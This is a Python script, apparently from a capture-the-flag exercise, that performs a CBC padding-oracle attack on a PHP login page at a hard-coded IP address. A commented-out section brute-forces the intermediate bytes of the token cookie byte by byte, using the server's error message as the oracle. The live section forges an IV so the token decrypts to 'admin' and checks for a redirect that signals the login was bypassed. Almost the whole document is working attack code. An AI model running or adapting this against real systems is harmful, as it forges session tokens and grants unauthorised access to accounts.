# -*- coding: utf-8 -*-
__author__ = 'angelwhu'

import base64
import requests
import urllib

iv = base64.b64decode("V2NKZTBqNElETVkyMU8waA==")  # iv length is 16
#cipher = base64.b64decode("EzDYjiFgH1Q=") # cipher length is 8
block_size = 16

immediate_value = [ -1 for i in range(block_size)]

session = requests.session()
session.cookies['PHPSESSID']='25mlb632dcp3nj88li718n24v7'

'''
#immediate_value = [-1, -1, 207, 136, 135, 24, 71, 254] #出错后，重新开始开始。
#ajust_round = 6  #出错后，从新的round开始,初始为0

#immediate_value = [-1, 1, 77, 114, 61, 0, 84, 38, 50, 57, 114, 20, 35, 32, 36, 101]
ajust_round  = 0
ajust_tempiv = 0 #出错后，设置新的处理tempiv。原来是0  如果立即数在0-block_size之间，会误认为是padding而出错。

for round in range(ajust_round,block_size):
    temp_iv =""
    for j in range(block_size-round,block_size):
        temp_iv = temp_iv + chr(immediate_value[j]^(round+1))

    res = -1
    for i in range(0xff+1):
        #temp = chr(0)*(block_size-1-round) + chr(i) + temp_iv
        temp = chr(ajust_tempiv)*(block_size-1-round) + chr(i) + temp_iv
        #print temp
        session.cookies['token'] = urllib.quote(base64.b64encode(temp))
        #print i
        response = session.get('http://111.231.111.54/login.php')
        #print session.cookies
        if 'Error!' in response.text:
            #print "666"
            #print response.text
            None
        else:
            res = i
            print i
            print "666"
            break
    if res == -1:
        #print session.cookies
        print round
        print immediate_value
        print "dddderrrrrrrrrrrrrrrrrrr"
        exit()
    else:
        #print session.cookies
        print response.text
        print res
        immediate_value[block_size-1-round ] = res ^ (1+round)
        print immediate_value


'''

session.cookies['PHPSESSID']='25mlb632dcp3nj88li718n24v7'
immediate_value = [-1, 38, 17, 88, 56, 1, 41, 126, 10, 40, 126, 56, 55, 21, 48, 115]

target_plain = "admin" + chr(11)*11
for k_0 in range(1,0xff+1):

    immediate_value[0] = k_0
    #print immediate_value
    target_iv = ""
    for i in range(block_size):
        target_iv = target_iv + chr(ord(target_plain[i])^immediate_value[i])
    tmp_token = base64.b64encode(target_iv)
    print tmp_token
    session.cookies['token'] = urllib.quote(tmp_token)
    #print k_0
    response = session.get('http://111.231.111.54/login.php')
    #print session.cookies
    print response.headers
    if response.status_code == 302:
        print tmp_token
        print "666"
        break
    else:
        None


